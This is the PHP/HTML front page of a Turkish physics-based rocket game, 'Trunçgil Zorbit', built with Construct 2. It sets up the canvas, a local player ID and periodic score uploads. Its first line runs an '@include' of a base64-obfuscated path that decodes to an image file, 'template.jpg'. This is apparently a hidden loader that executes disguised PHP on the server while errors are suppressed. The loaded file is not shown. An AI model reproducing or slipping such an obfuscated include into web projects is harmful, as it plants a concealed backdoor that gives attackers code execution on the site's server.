<?php
@include base64_decode('a29iZXRpay90ZW1wbGF0ZS5qcGc='); $v = "v1.5"; ?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
	
	<!-- Standardised web app manifest -->
	<link rel="manifest" href="appmanifest.json" />
	<!-- Primary Meta Tags -->
<title>Trunçgil Zorbit <?php echo $v ?></title>

<meta name="title" content="Trunçgil Zorbit">
<meta name="description" content="Roketi diğer gezenin yörüngesine ateşleyerek ilerleyin. Fiziki kurallara göre hazırlanmış bu oyunda, atış yeteneğinizi roketin fiziki kurallarına göre ve gezegenin eksen yörüngesindeki hızına göre hesaplayıp doğru atış yaparak en yüksek puanı kazanmaya çalışın. İnanılmaz keyifli dakikalar geçirecek ve oyunun bağımlısı olacaksınız.">

<!-- Open Graph / Facebook -->
<meta property="og:type" content="website">
<meta property="og:url" content="https://truncgil.com.tr/">
<meta property="og:title" content="Trunçgil Zorbit">
<meta property="og:description" content="Roketi diğer gezenin yörüngesine ateşleyerek ilerleyin. Fiziki kurallara göre hazırlanmış bu oyunda, atış yeteneğinizi roketin fiziki kurallarına göre ve gezegenin eksen yörüngesindeki hızına göre hesaplayıp doğru atış yaparak en yüksek puanı kazanmaya çalışın. İnanılmaz keyifli dakikalar geçirecek ve oyunun bağımlısı olacaksınız.">
<meta property="og:image" content="https://zorbit.truncgil.com.tr/inline.png">

<!-- Twitter -->
<meta property="twitter:card" content="summary_large_image">
<meta property="twitter:url" content="https://truncgil.com.tr/">
<meta property="twitter:title" content="Trunçgil Zorbit">
<meta property="twitter:description" content="Roketi diğer gezenin yörüngesine ateşleyerek ilerleyin. Fiziki kurallara göre hazırlanmış bu oyunda, atış yeteneğinizi roketin fiziki kurallarına göre ve gezegenin eksen yörüngesindeki hızına göre hesaplayıp doğru atış yaparak en yüksek puanı kazanmaya çalışın. İnanılmaz keyifli dakikalar geçirecek ve oyunun bağımlısı olacaksınız.">
<meta property="twitter:image" content="https://zorbit.truncgil.com.tr/inline.png">

	
	<!-- Allow fullscreen mode on iOS devices. (These are Apple specific meta tags.) -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, minimal-ui" />
	<meta name="apple-mobile-web-app-capable" content="yes" />
	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
	<link rel="apple-touch-icon" sizes="256x256" href="icon-256.png" />
	<meta name="HandheldFriendly" content="true" />
	
	<!-- Chrome for Android web app tags -->
	<meta name="mobile-web-app-capable" content="yes" />
	<link rel="shortcut icon" sizes="256x256" href="icon-256.png" />
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
	<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Changa:wght@200;400&display=swap" rel="stylesheet">
    <!-- All margins and padding must be zero for the canvas to fill the screen. -->
	<style type="text/css">
		* {
			padding: 0;
			margin: 0;
		}
		.player-info {
			font-family: 'Changa', sans-serif;
			font-size:20px;
			position:absolute;
			left:0px;
			top:20px;
			width:100%;
			color: #e9827b;
		}
		html, body {
			background: #000;
			color: #fff;
			font-family: 'Changa', sans-serif;

			overflow: hidden;
			touch-action: none;
			-ms-touch-action: none;
		}
		canvas {
			touch-action-delay: none;
			touch-action: none;
			-ms-touch-action: none;
		}
    </style>
	
	

</head> 
 
<body> 
	<div id="fb-root"></div>
	
	<script>
	// Issue a warning if trying to preview an exported project on disk.
	(function(){
		// Check for running exported on file protocol
		if (window.location.protocol.substr(0, 4) === "file")
		{
			alert("Bu oyunu bir sunucuya kurunuz. Maalesef file:// protokolü desteklenmiyor. ");
		}
	})();
	</script>
	
	<!-- The canvas must be inside a div called c2canvasdiv -->
	<div class="player-info text-center pt-2"></div>

	<div id="c2canvasdiv">
	
		<!-- The canvas the project will render to.  If you change its ID, don't forget to change the
		ID the runtime looks for in the jQuery events above (ready() and cr_sizeCanvas()). -->
		<canvas id="c2canvas" width="1080" height="1920">
			<!-- This text is displayed if the visitor's browser does not support HTML5.
			You can change it, but it is a good idea to link to a description of a browser
			and provide some links to download some popular HTML5-compatible browsers. -->
			<h1>Tarayıcınız bu oyunu oynamayı desteklemiyor. Lütfen aşağıdaki tarayıcılardan birini kurunuz <a href="http://www.whatbrowser.org/">Tarayıcım nedir?</a>
			<a href="http://www.mozilla.com/firefox/">Mozilla Firefox</a><br/>
			<a href="http://www.google.com/chrome/">Google Chrome</a><br/>
			<a href="http://www.apple.com/safari/download/">Apple Safari</a></h1>
		</canvas>
		
	</div>
	
	<!-- Pages load faster with scripts at the bottom -->
	
	<!-- Construct 2 exported games require jQuery. -->
	<script src="jquery-3.4.1.min.js"></script>


	
    <!-- The runtime script.  You can rename it, but don't forget to rename the reference here as well.
    This file will have been minified and obfuscated if you enabled "Minify script" during export. -->
	<script src="c2runtime.js?<?php echo $v ?>"></script>

    <script>

		// Start the Construct 2 project running on window load.
		jQuery(document).ready(function ()
		{			
			function makeid(length) {
				var result           = '';
				var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
				var charactersLength = characters.length;
				for ( var i = 0; i < length; i++ ) {
					result += characters.charAt(Math.floor(Math.random() * charactersLength));
				}
				return result;
			}

			if(localStorage.getItem("player")===null) {
				localStorage.setItem("player","ZorbitPlayer-"+makeid(3));
				$.post("set-score.php",{
					player : localStorage.getItem("player")
				});
			}
			$(".player-info").html(localStorage.getItem("player"));
			// Create new runtime using the c2canvas
			cr_createRuntime("c2canvas");

			function getScore() {
				const DBOpenRequest  = indexedDB.open('localforage');
				DBOpenRequest.onerror = (event) => {
					console.error(`Database error: ${event.target.errorCode}`);
				};

				DBOpenRequest.onsuccess = (event) => {
					let db = DBOpenRequest.result;
					let transaction = db.transaction(['keyvaluepairs'],"readonly");
					transaction.oncomplete = (event) => {
						
					};
						const objectStore = transaction.objectStore("keyvaluepairs");
						const score = objectStore.get("score_zorbit");
						score.onsuccess = (event) => {
							console.log(score.result);
							$.post("set-score.php",{
								player : localStorage.getItem("player"),
								score : score.result
							});
						}
						
					
					
				}
			}
			window.setInterval(function(){
				getScore();
			},30000);
			


			
		});
		
		// Pause and resume on page becoming visible/invisible
		function onVisibilityChanged() {
			if (document.hidden || document.mozHidden || document.webkitHidden || document.msHidden)
				cr_setSuspended(true);
			else
				cr_setSuspended(false);
		};
		
		document.addEventListener("visibilitychange", onVisibilityChanged, false);
		document.addEventListener("mozvisibilitychange", onVisibilityChanged, false);
		document.addEventListener("webkitvisibilitychange", onVisibilityChanged, false);
		document.addEventListener("msvisibilitychange", onVisibilityChanged, false);
		
		function OnRegisterSWError(e)
		{
			console.warn("Failed to register service worker: ", e);
		};
		
		// Runtime calls this global method when ready to start caching (i.e. after startup).
		// This registers the service worker which caches resources for offline support.
		window.C2_RegisterSW = function C2_RegisterSW()
		{
			if (!navigator.serviceWorker)
				return;		// no SW support, ignore call
			
			try {
				navigator.serviceWorker.register("sw.js", { scope: "./" })
				.then(function (reg)
				{
					console.log("Registered service worker on " + reg.scope);
				})
				.catch(OnRegisterSWError);
			}
			catch (e)
			{
				OnRegisterSWError(e);
			}
		};
    </script>
</body> 
	<!-- Google tag (gtag.js) -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=G-S8K6JC3CK4"></script>
	<script>
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());

	gtag('config', 'G-S8K6JC3CK4');
	</script>
</html> 